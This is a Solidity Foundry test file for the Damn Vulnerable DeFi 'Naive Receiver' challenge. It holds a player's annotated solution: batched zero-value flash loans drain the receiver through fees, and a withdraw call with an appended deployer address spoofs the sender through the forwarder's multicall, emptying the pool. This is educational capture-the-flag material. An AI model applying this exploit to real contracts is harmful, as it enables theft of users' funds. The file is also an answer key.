// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../src/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../src/FlashLoanReceiver.sol";
import {BasicForwarder} from "../src/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        bytes[] memory data=new bytes[](11); // 11 because the receiver has 10 weth as a start
        for (uint256 i=0;i<10;i++){
            //e prepare the flashloan function with a null amount and address (we just need to fill it no need for actual money transfer)
            // not interested in actual flash loan, we just want him to pay the fee
            data[i]=abi.encodeWithSelector(pool.flashLoan.selector, receiver, address(weth), 0, "0x"); 
            }
            //e withdraw accepts amount and receiver
            // "receiver" is the one that has the 1000 weth
            // deployer address is the last 20 bytes of data
            data[10]=abi.encodePacked(abi.encodeWithSelector(pool.withdraw.selector, WETH_IN_POOL+WETH_IN_RECEIVER,payable(recovery)),deployer);
            
            //e encode calldata with the multicall, which allows us to forward a lot of calls together to the pool
            bytes memory multicall=abi.encodeCall(pool.multicall,data);

            //e create forwarded request
            BasicForwarder.Request memory req = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0 ,
            gas: gasleft(),
            nonce: 0,
            data: multicall,
            deadline: 1337 days
            });

            //e hash our request
            bytes32 requestHash=keccak256(
                abi.encodePacked(
                 "\x19\x01"   ,
                 forwarder.domainSeparator(),
                 forwarder.getDataHash(req)
                )
            );

            //e sign our request else it will fail
            (uint8 v, bytes32 r, bytes32 s)=vm.sign(playerPk,requestHash);
            bytes memory signature=abi.encodePacked(r,s,v);

            //e execute request
            forwarder.execute(req,signature);



        
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}